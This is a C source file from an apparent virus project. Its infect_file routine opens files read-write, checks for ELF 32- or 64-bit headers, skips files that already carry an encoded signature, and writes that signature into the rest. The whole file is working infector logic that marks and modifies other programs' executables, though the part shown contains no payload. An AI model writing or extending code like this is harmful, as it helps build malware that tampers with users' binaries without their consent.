#include "apocalypse.h"

static int can_infect(int file, e_targets target);
static int not_infected(int file);

void infect_file(const char *filepath, const e_targets target)
{
    const int file = open(filepath, O_RDWR);
    if (file < 0)
        return;

    if (can_infect(file, target) && not_infected(file))
    {
        char data[SIGNATURE_LENGTH];
        transform(data, SIGNATURE, SIGNATURE_LENGTH);
        write(file, data, SIGNATURE_LENGTH);
    }

    close(file);
    return;
}

static
int can_infect(const int file, const e_targets target)
{
    char buffer[SIGNATURE_ELF_LENGTH + 2];
    bzero(buffer, SIGNATURE_ELF_LENGTH + 2);

    switch (target)
    {
    case ANY_BINARY:
        read(file, buffer, SIGNATURE_ELF_LENGTH);
        return !strcmp(buffer, SIGNATURE_ELF);
    case X32_BIT_BINARY:
        read(file, buffer, SIGNATURE_ELF_LENGTH + 1);
        return !strcmp(buffer, SIGNATURE_ELF32);
    case X64_BIT_BINARY:
        read(file, buffer, SIGNATURE_ELF_LENGTH + 1);
        return !strcmp(buffer, SIGNATURE_ELF64);
    default: // NON_BINARY
        return TRUE;
    }
}

static
int not_infected(const int file)
{
    char data[SIGNATURE_LENGTH + 1];
    transform(data, SIGNATURE, SIGNATURE_LENGTH);
    data[SIGNATURE_LENGTH] = '\0';

    ssize_t length = strlen(data);
    char buffer[SIGNATURE_LENGTH + 1];
    lseek(file, -length, SEEK_END);

    const ssize_t len = read(file, buffer, length);
    buffer[len] = '\0';
    return len != length || strcmp(buffer, data);
}
